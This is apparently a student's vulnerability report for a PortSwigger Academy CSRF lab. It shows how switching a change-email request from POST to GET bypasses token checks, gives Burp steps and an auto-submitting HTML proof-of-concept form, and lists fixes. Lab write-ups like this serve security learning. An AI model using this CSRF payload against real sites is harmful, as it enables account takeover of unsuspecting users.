# CSRF Vulnerability report: WE LIKE TO BLOG (portswigger academy lab)

Summary:
The We Like To Blog webpage is susceptible to a CSRF attack using a very simple method of bypassing their filters.
The current filter in place blocks any cross-site POST requests from affecting a user's account. It currently validates this by matchin a csrf token to the session id. We can get around this filter by changing the POST request to a GET request, ending in the ability to change the user's email address. I'd rate this as a high probability, medium-high impact, as this is a simple attack, allowing an attacker to change account information, and possibly use the email address to change the user's password. Below are steps to recreate the attack.

Attack:
1. Log into your test account, and navigate to the 'My Account' page.
2. Make sure your session is proxied through burp, and change your account's email address
3. In burp's `Proxy` tab, look for the request stating `/my-account/change-email` and send it to the Burp Repeater.
4. Change the csrf token and test, the request fails. Right click the request and click `Change Request Method`
5. Send the request again, and even without a valid token, the service accepts the request.
6. Create a CSRF code, if using Burp Suite Pro, right click, go to `Engagement tools -> Generate CSRF PoC`
7. My request was as follows:
```<html>
  <body>
    <form action="https://0a4f004904b84b1f8085a35f00310056.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hacked&#64;exploit&#46;com" />
      <input type="hidden" name="csrf" value="Zqg1i7QhXVlXPIbzt8v7X3jeEQ30by" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
8. Open this web-page, and essentially, the logged in user will be forced to change their email to `hacked@exploit.com`

Steps of resolution:
1. Enforce a strict SameSite protocol
2. Enforce request method to `POST` requests only
3. Ensure that with new protocols in place, ensure method override is blocked
